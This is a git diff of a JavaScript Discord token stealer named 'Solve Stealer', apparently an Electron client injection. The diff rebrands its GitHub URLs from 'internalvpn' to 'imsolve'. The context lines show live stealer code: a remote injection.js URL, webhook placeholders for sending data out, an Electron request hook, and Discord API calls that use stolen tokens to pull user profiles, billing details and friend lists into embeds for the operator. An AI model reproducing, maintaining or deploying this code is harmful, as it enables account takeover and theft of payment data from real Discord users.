@@ -19,7 +19,7 @@ var config = {
 
     creator: "Solve",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/internalvpn/injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/imsolve/injection/main/injection.js",
     webhook: "%WEBHOOK%",
     Placed: "%API_URL%",
     Filter: {
@@ -69,7 +69,7 @@ const makeEmbed = async ({
 }) => {
     var params = {
         username: "Solve Stealer",
-        avatar_url: "https://raw.githubusercontent.com/internalvpn/Sovle-Stealer/main/imgs/solve.jpg",
+        avatar_url: "https://raw.githubusercontent.com/imsolve/Sovle-Stealer/main/imgs/solve.jpg",
         content: "",
         embeds: [{
             title: title,
@@ -81,7 +81,7 @@ const makeEmbed = async ({
             },
             
             footer: {
-                text: `Solve | https://GitHub.com/internalvpn/`
+                text: `PANIC | https://GitHub.com/imsolve/`
             },
 
         }]
@@ -317,8 +317,8 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/internalvpn/Sovle-Stealer/main/imgs/solve.jpg"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/internalvpn/injection/main/solve.png"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/imsolve/Sovle-Stealer/main/imgs/solve.jpg"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/imsolve/injection/main/solve.png"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -355,7 +355,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Solve Stealer :pill:](https://github.com/internalvpn/Solve-Stealer)`,
+                value: `[Solve Stealer :pill:](https://github.com/imsolve/Solve-Stealer)`,
                 inline: !0
             }, {
                 name: "Solve Files",
@@ -410,8 +410,8 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/internalvpn/Sovle-Stealer/main/imgs/solve.jpg"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/internalvpn/injection/main/banner.gif"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/imsolve/Sovle-Stealer/main/imgs/solve.jpg"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/imsolve/injection/main/banner.gif"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -448,7 +448,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Solve Stealer  :pill:](https://github.com/internalvpn/Solve-Stealer)`,
+                    value: `[Solve Stealer  :pill:](https://github.com/imsolve/Solve-Stealer)`,
                     inline: !0
                 }, {
                     name: "Solve Files",
@@ -584,8 +584,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/internalvpn/Sovle-Stealer/main/imgs/solve.jpg"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/internalvpn/injection/main/banner.gif"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/imsolve/Sovle-Stealer/main/imgs/solve.jpg"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/imsolve/injection/main/banner.gif"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -634,7 +634,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Solve Stealer :pill:](https://github.com/internalvpn/Solve-Stealer)`,
+                    value: `[Solve Stealer :pill:](https://github.com/imsolve/Solve-Stealer)`,
                     inline: !0
                 }, {
                     name: "Solve Files",
@@ -719,7 +719,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Solve Stealer :pill:](https://github.com/internalvpn/Solve-Stealer)`,
+                        value: `[Solve Stealer :pill:](https://github.com/imsolve/Solve-Stealer)`,
                         inline: !0
                     }, {
                         name: "Solve Files",
@@ -806,7 +806,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Solve Stealer :pill:](https://github.com/internalvpn/Solve-Stealer)`,
+                        value: `[Solve Stealer :pill:](https://github.com/imsolve/Solve-Stealer)`,
                         inline: !0
                     }, {
                         name: "Solve Files",
